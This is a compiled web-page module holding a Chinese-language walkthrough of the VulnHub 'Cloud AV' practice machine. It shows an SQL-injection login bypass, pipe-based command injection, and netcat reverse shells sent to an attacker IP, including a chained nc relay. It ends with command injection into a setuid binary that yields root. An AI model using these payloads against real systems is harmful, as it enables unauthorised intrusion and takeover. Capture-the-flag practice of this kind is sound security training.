import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e as i}from"./app-e0432c65.js";const n="/assets/image-20230912105614822-534c036b.png",t="/assets/image-20230912105749282-d4811571.png",d="/assets/image-20230912110004333-801de839.png",c="/assets/image-20230912110136955-e09e5dc7.png",l="/assets/image-20230912110326678-ae0632ba.png",r="/assets/image-20230912110516822-409130bf.png",p="/assets/image-20230912111152562-e193a41f.png",o="/assets/image-20230912111437288-5dc21cba.png",m="/assets/image-20230912112207698-4b2a877a.png",u="/assets/image-20230912112636765-3a4582d0.png",g="/assets/image-20230912112648351-fda07658.png",v="/assets/image-20230912112843998-8f331961.png",h={},b=i(`<h1 id="下载地址" tabindex="-1"><a class="header-anchor" href="#下载地址" aria-hidden="true">#</a> 下载地址</h1><p>https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p><h1 id="靶机目标" tabindex="-1"><a class="header-anchor" href="#靶机目标" aria-hidden="true">#</a> 靶机目标</h1><p>获取靶机root权限</p><h1 id="详细步骤" tabindex="-1"><a class="header-anchor" href="#详细步骤" aria-hidden="true">#</a> 详细步骤</h1><h2 id="主机发现" tabindex="-1"><a class="header-anchor" href="#主机发现" aria-hidden="true">#</a> 主机发现</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>arp-scan -l -I eth1 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+n+`" alt="image-20230912105614822"></p><p>发现存活主机</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nmap -sV 192.168.56.105
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+t+'" alt="image-20230912105749282"></p><p>发现开放 22 和 8080端口</p><h2 id="web信息收集" tabindex="-1"><a class="header-anchor" href="#web信息收集" aria-hidden="true">#</a> web信息收集</h2><p>进入192.168.56.105:8080后发现需要登录</p><p><img src="'+d+'" alt="image-20230912110004333"></p><p>弱密码和万能密码都试一遍</p><p>发现万能密码<code>1&quot;or 1=1-- -</code>可以直接登录</p><p><img src="'+c+'" alt="image-20230912110136955"></p><p>输入命令后发现并没有放回想要的信息</p><p>尝试管道符<code>id|id</code>可以放回有效信息</p><p><img src="'+l+`" alt="image-20230912110326678"></p><h2 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h2><p>开始反弹shell</p><p>查看靶机是否有nc命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>id|which nc
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+r+`" alt="image-20230912110516822"></p><p>发现有nc命令，所以可以使用nc反弹shell</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -lvvp 6666									//攻击端

id|nc 192.168.56.103 6666 -e /bin/sh			//靶机
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现怎么都弹不过来，查阅资料后，发现nc老版本没有-e命令，于是选择用nc串联来反弹shell</p><p>现在攻击端开启俩个监听端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -lvvp 7777
nc -lvvp 8888

id|nc 192.168.56.103 7777 | /bin/sh |nc 192.168.56.103 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+p+'" alt="image-20230912111152562"></p><p>反弹shell成功</p><p>nc串联后到前面的7777端口发送命令，会在8888端口回显</p><p><img src="'+o+`" alt="image-20230912111437288"></p><p>然后信息收集一番并无结果</p><p>然后</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ls -l /home/scanner
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+m+'" alt="image-20230912112207698"></p><p>发现<code>update_cloudav</code>有root权限，且<code>update_cloudav.c</code>为源码，进行代码审计</p><p>尝试运行，报出提示</p><p><img src="'+u+'" alt="image-20230912112636765"></p><p><img src="'+g+'" alt="image-20230912112648351"></p><p><img src="'+v+`" alt="image-20230912112843998"></p><p>发现需要输入一个参数使用，且需要<code>&quot;&quot;</code>，现在尝试运用管道符和nc串联反弹shell</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>nc -lnvp 7777
nc -lnvp 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./update_cloudav &quot;a|nc 10.0.0.14 7777 | /bin/sh | nc 10.0.0.14 8888&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功后，发现已经是root权限</p>`,48),_=[b];function x(f,w){return a(),s("div",null,_)}const q=e(h,[["render",x],["__file","02vulnhub-BOREDHACKERBLOG-CLOUD-AV.html.vue"]]);export{q as default};
